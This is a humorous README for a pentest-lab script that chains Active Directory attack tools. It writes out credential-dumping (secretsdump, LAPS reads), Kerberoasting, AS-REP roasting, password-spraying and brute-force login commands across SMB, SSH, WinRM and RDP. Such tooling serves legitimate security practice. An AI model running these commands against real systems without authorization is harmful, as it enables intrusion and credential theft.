# VeryStupidEnumeration
Stupid? Well you came to the right place. 


Sometimes I don't remember which Impacket script to use as I do Pentest Labs, and sometimes I just want to run all of them at once like a script kiddie, but dumber and lazier. I'm creating the script as a way to dump a ton of information at myself at once, hoping that something, anything, jogs my memory into accidentally doing something smart on autopilot. 

Pros: It easy.

Cons: Someone might see you, and if you live in an at-will state, you could be fired. 

## Usage
This script *prompts you* for Domaoin, IP, dc-ip, user or userlist, and password or passwordlist, and then runs commands based on what you gave it with these four scenarios:
1. valid user and password
2. valid user and password list
3. user list and valid password
4. user list and password list (good luck dummy)

You probably don't want to run this with long lists, use something else for that. It will run a bunch of commands, and then send the output to a file. Here are the commands that it runs based on each of the scenarios:

Scenario 1 (user/password): 
- `bloodhound-python -u $user -p '$password' -ns $ip -d $domain -c all`
- `enum4linux -u "$user" -p "$password" -a $IP`
- `impacket-secretsdump $domain/$user:'$password'@$IP`
- `impacket-GetUserSPNs $domain/$user:'$password' -dc-ip $DC-IP`
- `impacket-GetNPUsers $domain/$user:'$password' -dc-ip $DC-IP`
- `impacket-rpcdump $domain/$user:$password@$IP`
- `ldapdomaindump -u $domain\\$user -p '$password' $domain -o ldapdomaindump`
- `nxc ldap $IP -u $user -p $password --kdcHost $IP -M laps`
- `nxc smb $IP -u $user -p '$password' -d $domain` 
- `nxc ssh $IP -u $user -p '$password' -d $domain` 
- `nxc winrm $IP -u $user -p '$password' -d $domain` 
- `nxc rdp $IP -u $user -p '$password' -d $domain --rdp-timeout 30` 
- `smbclient -L //$IP/ -U $user%$password`

Scenario 2 (user/passwordlist):
- `enum4linux -a $IP`
- `kerbrute bruteuser -d $domain $passwordlist $user`
- `ldapsearch -LLL -x -H ldap://$domain -b'' -s base '(objectclass=\*)'`
- `nxc smb $IP -u $user -p $passwordlist -d $domain --continue-on-success`
- `nxc ssh $IP -u $user -p $passwordlist -d $domain --continue-on-success`
- `nxc winrm $IP -u $user -p $passwordlist -d $domain --continue-on-success`
- `nxc rdp $IP -u $user -p $passwordlist -d $domain --continue-on-success --rdp-timeout 30`
-`smbclient -L \\\\$IP\\ -u '$user' -p ''`

Scenario 3 (userlist/password):
- `enum4linux -a $IP`
- `kerbrute passwordspray -d $domain $userlist $password`
- `kerbrute userenum -d $domain $userlist`
- `ldapsearch -LLL -x -H ldap://$domain -b'' -s base '(objectclass=\*)'`
- `nxc smb $IP -u $userlist -p '$password' -d $domain --continue-on-success`
- `nxc ssh $IP -u $userlist -p '$password' -d $domain --continue-on-success`
- `nxc winrm $IP -u $userlist -p '$password' -d $domain --continue-on-success`
- `nxc rdp $IP -u $userlist -p '$password' -d $domain --continue-on-success --rdp-timeout`
- `smbclient -L \\\\$IP\\ -N`

Scenario 4 (userlist/passwordlist):
- `enum4linux -a $IP`
- `kerbrute userenum -d $domain $userlist`
- `ldapsearch -LLL -x -H ldap://$domain -b'' -s base '(objectclass=\*)'`
- `nxc smb $IP -u '' -p '' --shares --users`
- `nxc ssh $IP -u $userlist -p $passwordlist`
- `nxc winrm $IP -u $userlist -p $passwordlist`
- `nxc rdp $IP -u $userlist -p $passwordlist --rdp-timeout 30`
- `smbclient -L \\\\$IP\\ -N`
  
It could not be easier, and frankly it shouldn't be this easy. 
